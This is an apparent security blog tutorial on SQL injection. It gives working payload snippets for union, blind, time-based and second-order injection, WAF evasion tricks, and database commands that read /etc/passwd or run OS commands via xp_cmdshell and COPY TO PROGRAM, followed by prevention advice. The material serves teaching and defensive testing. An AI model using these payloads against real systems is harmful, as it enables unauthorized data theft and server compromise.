---
title: "Advanced SQL Injection Techniques"
date: "2024-01-18"
category: "Web Security"
tags: ["web-security"]
excerpt: "Explore advanced SQL injection techniques including blind SQLi, time-based attacks, and modern bypass methods for web application security testing."
---

# Advanced SQL Injection Techniques

SQL injection remains one of the most critical web application vulnerabilities. While basic union-based attacks are well-documented, advanced techniques require deeper understanding of database internals and application logic.

## Types of SQL Injection

### Union-Based Injection
The classic approach using UNION statements to extract data:

```sql
' UNION SELECT username, password FROM users--
```

### Blind SQL Injection
When no direct output is visible, we use conditional responses:

```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
```

### Time-Based Blind Injection
Using database sleep functions to infer data:

```sql
'; IF (1=1) WAITFOR DELAY '00:00:05'--
```

## Advanced Bypass Techniques

### WAF Evasion
Modern applications use Web Application Firewalls (WAFs) that can be bypassed:

- **Case variation**: `UnIoN SeLeCt`
- **Comment insertion**: `UN/**/ION SE/**/LECT`
- **Encoding**: URL, hex, or unicode encoding

### Second-Order Injection
Payload stored in database and executed later:

```sql
-- First request stores payload
INSERT INTO users (name) VALUES ('admin''--')

-- Second request triggers injection
SELECT * FROM logs WHERE user='admin'--'
```

## Database-Specific Techniques

### MySQL
```sql
-- Information gathering
SELECT @@version, @@datadir, USER()

-- File operations
SELECT LOAD_FILE('/etc/passwd')
```

### PostgreSQL
```sql
-- Command execution
COPY (SELECT '') TO PROGRAM 'id'

-- Large object abuse
SELECT lo_import('/etc/passwd', 1337)
```

### MSSQL
```sql
-- Extended stored procedures
EXEC xp_cmdshell 'whoami'

-- Linked servers
SELECT * FROM OPENROWSET('SQLOLEDB','server';'sa';'password','SELECT @@version')
```

## Automated Tools

Popular SQL injection tools:
- **SQLMap**: Comprehensive automated testing
- **Burp Suite**: Manual testing with extensions
- **NoSQLMap**: For NoSQL databases

## Prevention Strategies

### Parameterized Queries
```python
# Secure approach
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Vulnerable approach
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

### Input Validation
- Whitelist allowed characters
- Validate data types and ranges
- Implement proper error handling

### Least Privilege
- Use dedicated database users
- Limit database permissions
- Disable unnecessary features

## Conclusion

SQL injection attacks continue to evolve, requiring security professionals to stay updated with the latest techniques and countermeasures. Always test in authorized environments only.